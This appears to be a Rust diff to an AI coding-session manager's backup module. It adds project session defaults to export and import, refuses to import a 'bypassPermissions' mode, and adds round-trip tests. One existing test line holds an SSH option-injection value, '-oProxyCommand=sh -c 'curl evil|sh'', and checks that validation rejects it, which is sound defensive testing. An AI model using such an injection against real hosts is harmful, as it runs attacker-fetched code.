@@ -5,9 +5,9 @@
 //! library (file contents included) with their groups, the Agents / Commands library, MCP servers,
 //! VPS servers, account metadata (GitHub, GitLab, AWS, Azure, Google, Claude), notes / todos and Slack threads (messages and
 //! translations; attachments are re-downloaded) and projects with their repos, enabled
-//! Skills / Rules / groups / Agents / Commands / MCP / VPS servers, account links. Sessions and
-//! usage history stay on the machine; the bookmarks on them travel, and land on the same session
-//! when the importing machine has it. The user's response styles travel too (a project's own ones
+//! Skills / Rules / groups / Agents / Commands / MCP / VPS servers, account links, defaults for new
+//! sessions. Sessions and usage history stay on the machine; the bookmarks on them travel, and
+//! land on the same session when the importing machine has it. The user's response styles travel too (a project's own ones
 //! with their project). The trash is local too: a project or session in it is not
 //! exported (nor the bookmarks on such a session).
 //!
@@ -201,6 +201,39 @@ struct ProjectEntry {
     mcp_servers: Vec<String>,
     #[serde(default)]
     servers: Vec<ProjectServerEntry>,
+    /// Defaults for new sessions (UX-19). Older backups have none: a matched project keeps its own.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    session_defaults: Option<SessionDefaultsEntry>,
+}
+
+/// A project's defaults for new sessions (`commands::session_defaults`); unset follows the global
+/// setting. The style travels like the response styles themselves: by id, else by name.
+#[derive(Serialize, Deserialize, Default, Debug, PartialEq)]
+struct SessionDefaultsEntry {
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    engine: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    model_claude: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    model_codex: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    permission_mode: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    effort: Option<String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    style: Option<StyleRefEntry>,
+}
+
+#[derive(Serialize, Deserialize, Debug, PartialEq)]
+struct StyleRefEntry {
+    /// A built-in key, or the style's id on the exporting machine.
+    key: String,
+    /// The user style's name, to find it when this machine has it under another id. `None`: a built-in.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    name: Option<String>,
+    /// The project's own style (else a global one).
+    #[serde(default)]
+    project: bool,
 }
 
 #[derive(Serialize, Deserialize)]
@@ -1293,6 +1326,35 @@ async fn collect_response_styles(db: &Db) -> Result<Vec<ResponseStyleEntry>, Str
         .collect())
 }
 
+/// A project's defaults for new sessions, `None` when it has none. A default style that no longer
+/// exists is left out, as runs skip it too.
+async fn collect_session_defaults(db: &Db, project_id: &str) -> Result<Option<SessionDefaultsEntry>, String> {
+    let d = crate::commands::session_defaults::load(db, project_id).await;
+    let style = match d.style {
+        None => None,
+        Some(key) if crate::commands::response_styles::builtin_body(&key).is_some() => {
+            Some(StyleRefEntry { key, name: None, project: false })
+        }
+        Some(key) => sqlx::query_as::<_, (String, Option<String>)>(
+            "SELECT name, project_id FROM response_styles WHERE id = ?",
+        )
+        .bind(&key)
+        .fetch_optional(db)
+        .await
+        .map_err(|e| e.to_string())?
+        .map(|(name, owner)| StyleRefEntry { key, name: Some(name), project: owner.is_some() }),
+    };
+    let entry = SessionDefaultsEntry {
+        engine: d.engine,
+        model_claude: d.model_claude,
+        model_codex: d.model_codex,
+        permission_mode: d.permission_mode,
+        effort: d.effort,
+        style,
+    };
+    Ok(Some(entry).filter(|e| *e != SessionDefaultsEntry::default()))
+}
+
 fn project_name_path(row: &sqlx::sqlite::SqliteRow) -> Option<ProjectRef> {
     let name: Option<String> = row.get("project_name");
     let path: Option<String> = row.get("project_path");
@@ -1465,6 +1527,7 @@ async fn collect_projects(db: &Db) -> Result<Vec<ProjectEntry>, String> {
             role: r.get("role"),
         })
         .collect();
+        let session_defaults = collect_session_defaults(db, &id).await?;
         out.push(ProjectEntry {
             id,
             name: row.get("name"),
@@ -1498,6 +1561,7 @@ async fn collect_projects(db: &Db) -> Result<Vec<ProjectEntry>, String> {
             commands,
             mcp_servers,
             servers,
+            session_defaults,
         });
     }
     Ok(out)
@@ -1933,6 +1997,16 @@ async fn apply_bundle(
     for entry in &bundle.response_styles {
         let result = import_response_style(db, entry).await;
         report.record("responseStyles", &entry.name, result);
+    }
+    // After the styles, so a project's default style finds the one it names.
+    for (index, id) in &project_ids {
+        let entry = &bundle.projects[*index];
+        let Some(style) = entry.session_defaults.as_ref().and_then(|d| d.style.as_ref()) else {
+            continue;
+        };
+        if let Err(e) = import_project_style(db, id, style).await {
+            report.warnings.push(format!("projects '{}': default response style: {e}", entry.name));
+        }
     }
 
     if !bundle.slack_threads.is_empty() {
@@ -3675,10 +3749,106 @@ async fn import_project(
         }
     }
 
+    if let Some(defaults) = &entry.session_defaults {
+        touched |= import_session_defaults(db, &id, defaults, &mut warnings).await?;
+    }
+
     if touched && outcome == Upsert::Unchanged {
         outcome = Upsert::Updated;
     }
     Ok((outcome, id, warnings))
+}
+
+/// Merge a project's imported defaults for new sessions, the style aside ([`import_project_style`],
+/// once the styles are in). A value set in the backup replaces the local one; an unset one keeps
+/// it. A value this version does not take is left out with a warning, and so is a default
+/// permission mode of `bypassPermissions`: like the global setting, an import never widens what a
+/// run may do. True when something changed.
+async fn import_session_defaults(
+    db: &Db,
+    project_id: &str,
+    entry: &SessionDefaultsEntry,
+    warnings: &mut Vec<String>,
+) -> Result<bool, String> {
+    use crate::commands::session_defaults::{self as defaults, ENGINES};
+    let mut take = |field: &str, value: &Option<String>, ok: &dyn Fn(&str) -> Result<(), String>| {
+        let value = value.as_deref().map(str::trim).filter(|v| !v.is_empty())?;
+        match ok(value) {
+            Ok(()) => Some(value.to_string()),
+            Err(e) => {
+                warnings.push(format!("default {field} left out: {e}"));
+                None
+            }
+        }
+    };
+    let known = |list: &'static [&'static str]| {
+        move |v: &str| if list.contains(&v) { Ok(()) } else { Err(format!("unknown value '{v}'")) }
+    };
+    let model = |engine: &'static str| move |v: &str| defaults::check_model(engine, Some(v.to_string())).map(|_| ());
+    let engine = take("engine", &entry.engine, &known(ENGINES));
+    let model_claude = take("Claude model", &entry.model_claude, &model("claude"));
+    let model_codex = take("Codex model", &entry.model_codex, &model("codex"));
+    let permission_mode = take("permission mode", &entry.permission_mode, &|v: &str| match v {
+        "bypassPermissions" => Err("it would let the project's sessions skip every permission prompt".into()),
+        v if crate::commands::runs::is_valid_permission_mode(v) => Ok(()),
+        v => Err(format!("unknown value '{v}'")),
+    });
+    let effort = take("effort", &entry.effort, &known(crate::commands::runs::EFFORT_LEVELS));
+
+    let current = defaults::load(db, project_id).await;
+    let merged = defaults::ProjectSessionDefaults {
+        engine: engine.or(current.engine.clone()),
+        model_claude: model_claude.or(current.model_claude.clone()),
+        model_codex: model_codex.or(current.model_codex.clone()),
+        permission_mode: permission_mode.or(current.permission_mode.clone()),
+        effort: effort.or(current.effort.clone()),
+        style: current.style.clone(),
+    };
+    if merged == current {
+        return Ok(false);
+    }
+    defaults::write(db, project_id, &merged).await?;
+    Ok(true)
+}
+
+/// Set a project's imported default style: a built-in, else the style with the exported id in the
+/// same scope (global / this project), else the one with its name there. True when it changed.
+async fn import_project_style(db: &Db, project_id: &str, style: &StyleRefEntry) -> Result<bool, String> {
+    let key = if crate::commands::response_styles::builtin_body(&style.key).is_some() {
+        Some(style.key.clone())
+    } else {
+        let scope = style.project.then_some(project_id);
+        let by_id: Option<String> = sqlx::query_scalar(
+            "SELECT id FROM response_styles WHERE id = ? AND IFNULL(project_id, '') = IFNULL(?, '')",
+        )
+        .bind(&style.key)
+        .bind(scope)
+        .fetch_optional(db)
+        .await
+        .map_err(|e| e.to_string())?;
+        match (by_id, &style.name) {
+            (Some(id), _) => Some(id),
+            (None, Some(name)) => sqlx::query_scalar(
+                "SELECT id FROM response_styles WHERE IFNULL(project_id, '') = IFNULL(?, '') AND name = ? COLLATE NOCASE",
+            )
+            .bind(scope)
+            .bind(name)
+            .fetch_optional(db)
+            .await
+            .map_err(|e| e.to_string())?,
+            (None, None) => None,
+        }
+    };
+    let key = key.ok_or("the style is not on this machine")?;
+    let changed = sqlx::query("UPDATE projects SET default_style = ? WHERE id = ? AND default_style IS NOT ?")
+        .bind(&key)
+        .bind(project_id)
+        .bind(&key)
+        .execute(db)
+        .await
+        .map_err(|e| e.to_string())?
+        .rows_affected();
+    Ok(changed > 0)
 }
 
 #[cfg(test)]
@@ -3747,6 +3917,95 @@ mod tests {
         assert!(validate_vps_entry(&entry("-oProxyCommand=sh -c 'curl evil|sh' #", "example.com")).is_err());
         assert!(validate_vps_entry(&entry("deploy", "-oX")).is_err());
         assert!(validate_vps_entry(&VpsEntry { port: 0, ..entry("deploy", "example.com") }).is_err());
+    }
+
+    /// UX-19: a project's defaults for new sessions travel with it; its style by id, else by name.
+    #[tokio::test]
+    async fn project_session_defaults_round_trip() {
+        use crate::commands::session_defaults::{self as defaults, ProjectSessionDefaults};
+        let o = |v: &str| Some(v.to_string());
+        let source = test_db().await;
+        sqlx::query(
+            "INSERT INTO projects (id, name, path, created_at) VALUES ('p1', 'web', '/src/web', 'c'), ('p2', 'api', '/src/api', 'c')",
+        )
+        .execute(&source)
+        .await
+        .unwrap();
+        let team = crate::commands::response_styles::create(&source, Some("p1"), "Team", "", "Team text").await.unwrap();
+        let web = ProjectSessionDefaults {
+            engine: o("codex"),
+            model_claude: None,
+            model_codex: o("gpt-5.5"),
+            permission_mode: o("plan"),
+            effort: o("high"),
+            style: Some(team.id.clone()),
+        };
+        defaults::set(&source, "p1", web.clone()).await.unwrap();
+        let api = ProjectSessionDefaults { permission_mode: o("bypassPermissions"), style: o("concise"), ..Default::default() };
+        defaults::set(&source, "p2", api).await.unwrap();
+
+        let projects: Vec<ProjectEntry> = serde_json::from_value(
+            serde_json::to_value(collect_projects(&source).await.unwrap()).unwrap(),
+        )
+        .unwrap();
+        let by_name = |n: &str| projects.iter().find(|p| p.name == n).unwrap();
+        let web_entry = by_name("web").session_defaults.as_ref().unwrap();
+        assert_eq!(
+            web_entry.style,
+            Some(StyleRefEntry { key: team.id.clone(), name: o("Team"), project: true })
+        );
+        assert_eq!((web_entry.engine.as_deref(), web_entry.model_claude.as_deref()), (Some("codex"), None));
+        let styles = collect_response_styles(&source).await.unwrap();
+
+        // Another machine: same project names, its own "Team" style under another id.
+        let target = test_db().await;
+        sqlx::query(
+            "INSERT INTO projects (id, name, path, created_at) VALUES ('w', 'web', '/other/web', 'c'), ('a', 'api', '/other/api', 'c')",
+        )
+        .execute(&target)
+        .await
+        .unwrap();
+        let local_team = crate::commands::response_styles::create(&target, Some("w"), "Team", "", "old").await.unwrap();
+        defaults::set(&target, "a", ProjectSessionDefaults { permission_mode: o("acceptEdits"), effort: o("low"), ..Default::default() })
+            .await
+            .unwrap();
+
+        let (outcome, id, warnings) = import_project(&target, by_name("web"), false, None).await.unwrap();
+        assert_eq!((outcome, id.as_str()), (Upsert::Updated, "w"), "{warnings:?}");
+        let (_, _, warnings) = import_project(&target, by_name("api"), false, None).await.unwrap();
+        assert!(warnings.iter().any(|w| w.contains("permission mode left out")), "{warnings:?}");
+        for e in &styles {
+            import_response_style(&target, e).await.unwrap();
+        }
+        for (pid, entry) in [("w", by_name("web")), ("a", by_name("api"))] {
+            let style = entry.session_defaults.as_ref().unwrap().style.as_ref().unwrap();
+            assert!(import_project_style(&target, pid, style).await.unwrap());
+        }
+
+        // The project style lands on the local one of the same name.
+        assert_eq!(defaults::load(&target, "w").await, ProjectSessionDefaults { style: Some(local_team.id), ..web });
+        // bypassPermissions never comes in; what the backup leaves unset stays.
+        assert_eq!(
+            defaults::load(&target, "a").await,
+            ProjectSessionDefaults { permission_mode: o("acceptEdits"), effort: o("low"), style: o("concise"), ..Default::default() }
+        );
+        // Again: nothing changes.
+        assert!(!import_session_defaults(&target, "a", by_name("api").session_defaults.as_ref().unwrap(), &mut Vec::new())
+            .await
+            .unwrap());
+
+        // A backup from before UX-19 has no defaults: the project keeps its own.
+        let old: ProjectEntry = serde_json::from_value(serde_json::json!({
+            "id": "x", "name": "api", "path": "/other/api", "default_engine": "claude", "created_at": "c",
+        }))
+        .unwrap();
+        assert!(old.session_defaults.is_none());
+        import_project(&target, &old, false, None).await.unwrap();
+        assert_eq!(defaults::load(&target, "a").await.effort.as_deref(), Some("low"));
+        // A style that is nowhere here: reported, the project keeps its default.
+        let gone = StyleRefEntry { key: "gone".into(), name: o("Gone"), project: false };
+        assert!(import_project_style(&target, "a", &gone).await.is_err());
+        assert_eq!(defaults::load(&target, "a").await.style.as_deref(), Some("concise"));
     }
 
     #[tokio::test]
